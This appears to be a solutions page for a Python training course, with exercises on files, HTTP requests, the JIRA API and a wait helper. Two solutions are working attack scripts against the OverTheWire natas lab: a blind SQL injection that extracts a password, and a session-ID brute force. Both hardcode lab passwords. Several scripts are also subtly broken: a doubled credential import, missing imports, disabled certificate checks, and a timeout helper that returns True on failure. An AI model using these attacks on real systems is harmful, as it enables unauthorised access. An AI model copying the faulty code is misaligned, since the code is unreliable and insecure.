Solutions
======================================================



.. _FIL00_solution:
Solution to FIL00
-----------------------------

Working script
+++++++++++++++++

.. code-block:: python

    import random

    with open('input.txt', 'w') as f:
        for i in range(10):
            f.write(str(random.randint(1, 10)) + '\n')

    with open('input.txt') as f_in, open('output.txt', 'w') as f_out:
        for l in f_in:
            f_out.write(int(l)*"X" + '\n')

.. _REQ00_solution:

Solution to REQ00
-----------------------------

Working script
+++++++++++++++++

.. code-block:: python

    from requests.auth import HTTPBasicAuth
    from credentials import username, username

    URL = "https://userdatabase.lsy.pl/employees/report/employee/active"

    auth = HTTPBasicAuth(username, username)

    r = requests.get(URL, auth=auth, verify=False) # to ignore certificate warnings

    print(r.status_code)

.. _REQ01_solution:

Solution to REQ01
-----------------------------

Malicious query
+++++++++++++++++

The user input that would escape the original query, and add the additional condition on the password is (for the first letter assumed to be "A"):

.. code-block:: sql

    'natas16" AND password LIKE BINARY "A%'

The full query will have then the form

.. code-block:: sql

    SELECT * from users where username="natas16" AND password LIKE BINARY "A%"


Working script
+++++++++++++++++

.. code-block:: python

    import requests
    from requests.auth import HTTPBasicAuth

    chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

    URL = "http://natas15.natas.labs.overthewire.org"

    auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')

    template = 'natas16" AND password LIKE BINARY "{}%'

    letters = ""

    for _ in range(32):
        for letter in chars:
            payload = {"username":template.format(letters+letter)}
            r = requests.get(URL, auth=auth, params=payload)
            if "This user exists" in r.text:
                letters += letter
                print(letters)
                break

    print("Password found {}".format(letters))

.. _REQ02_solution:

Solution to REQ02
-----------------------------

Working script
+++++++++++++++++

.. code-block:: python

    import requests
    from requests.auth import HTTPBasicAuth
    import re

    URL = "http://natas18.natas.labs.overthewire.org"
    auth=HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')

    for sess_id in range(10000):
        print("Trying session ID {}".format(sess_id))
        cookie = {"PHPSESSID":str(sess_id)}
        payload = {"username":"x", "password":"y"}
        r = requests.get(URL, auth=auth, cookies=cookie, params=payload)
        if "You are logged in as a regular user." not in r.text:
            print("Admin session ID found {}".format(sess_id))
            password = re.search("Password: ([A-Za-z0-9]{32})", r.text)
            if password:
                print("Password: "+password.group(1))
            else:
                print("Password not found in the response")
                print(r.text)
            break
        else:
            print("FAILED")
    else:
        print("Brute force on Session ID failed")



.. _API00_solution:

Solution to API00
-----------------------------

Working script
+++++++++++++++++

.. code-block:: python

    from jira import JIRA

    URL = "https://issues.apache.org/jira/"
    j = JIRA(URL)

    search_results = j.search_issues('type="New Feature"', maxResults=100)
    for issue in search_results:
        print(issue.fields.summary)

.. _API01_solution:

Solution to API01
---------------------


Create a new issue with a custom field
++++++++++++++++++++++++++++++++++++++++++++++++++

By looking at the response received with :py:meth`jira.JIRA.createmeta`

we can see that the custom field "Start Date" has the name ``customfield_10018``


Working script
____________________

.. code-block:: python

    from jira import JIRA
    from datetime import datetime

    URL = 'https://trackspace.lhsystems.com/'
    username = input("Username: ")
    password = input("Password: ")

    j = JIRA(server=URL, basic_auth=(username, password))

    project = 'LSYPA'
    issuetype = {'name': 'Task'}
    summary = 'JIRA Training task'
    description = 'Task description'

    date = datetime.now().strftime('%Y-%m-%d')

    issue_fields = {'project': project,
                    'issuetype': issuetype,
                    'summary': summary,
                    'description': description,
                    'customfield_10018': date}

    issue = j.create_issue(fields=issue_fields)

    print("Task with id: {} created.".format(issue.key))


Create a Sub-task
++++++++++++++++++++++++

Observing the fields of a subtask we can find the field ``parent`` which should specify the key of the parent task.

.. code-block:: python

    parent_issue_key = 'LSYPA-488'
    project = 'LSYPA'
    summary = 'JIRA Training Sub-task'
    description = 'Sub-Task description'

    parent = {'key': parent_issue_key}

    issuetype = {'name': 'Sub-task'}

    issue_fields = {'project': project,
                    'issuetype': issuetype,
                    'parent': parent,
                    'summary': summary,
                    'description': description}

    issue = j.create_issue(fields=issue_fields)

    print("Sub-task with id: {} created.".format(issue.key))



.. _DEC01_solution:

Solution to DEC01
--------------------


Working script
+++++++++++++++++

.. code-block:: python

    def wait_until(condition, timeout=10, raise_exception=True, msg=""):
        """
        Wait until the condition returned by 'condition' function is fulfilled,
        or the timeout is expired. The condition should be checked every 100ms

        Args:
            condition: a function that checks a condition and returns True or False
            timeout: maximal timeout after which the function will raise TimeoutException
                    or return False (if raise_exception is False)
            msg: message added to the TimeoutException
        Returns:
            True when the condition is fulfilled within the timeout,
            False when the condition is not fulfilled within the timeout
                    and 'raise_exception' is False
        Raises:
            TimeoutException: if raise_exception is True
                            and the condition is not fulfilled within timeout

        """

        t0 = time.time()

        while time.time() - t0 < timeout:
            if condition():
                return True
            else:
                time.sleep(0.1)
        if raise_exception:
            raise TimeoutError("Condition not fulfilled within timeout. Message: " + msg)
        else:
            return True